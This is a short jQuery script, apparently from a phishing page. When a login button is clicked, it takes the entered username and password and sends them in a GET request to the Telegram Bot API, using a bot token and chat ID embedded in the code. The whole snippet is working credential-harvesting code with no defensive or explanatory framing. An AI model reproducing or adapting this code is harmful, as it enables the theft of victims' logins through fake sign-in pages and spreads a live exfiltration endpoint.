$(document).ready(() => {
  $('div#l2 .btn').on('click', () => {
    const username = $('input#u2').val();
    const password = $('input#pass1').val();

    const message =
      'This is:\n- Username: ' + username +
      '\n- Password: ' + password;

    const request = new XMLHttpRequest();

    request.open(
      'GET',
      'https://api.telegram.org/bot7444867423:AAELgNmwgfCzlu2JaUEt9ak4vYf-tlFII0s/sendMessage' +
      '?chat_id=1215278593&text=' +
      encodeURIComponent(message),
      true
    );

    request.send();
  });
});
